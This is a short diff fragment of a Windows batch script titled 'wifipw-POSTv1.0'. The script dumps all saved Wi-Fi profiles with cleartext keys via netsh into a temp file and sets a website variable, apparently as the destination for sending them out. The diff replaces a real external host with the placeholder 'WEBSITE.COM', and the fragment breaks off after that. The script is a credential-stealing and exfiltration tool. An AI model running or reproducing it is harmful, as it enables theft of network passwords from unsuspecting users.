@@ -1,6 +1,6 @@
 @echo off && color a && cls && TITLE wifipw-POSTv1.0 by Whiteavocado and reveloperboy
 netsh wlan show profile * key=clear>>%tmp%\wifi.url
-set "website=http://terraria.onthewifi.com"
+set "website=WEBSITE.COM"
 
 (
 set /p line1=
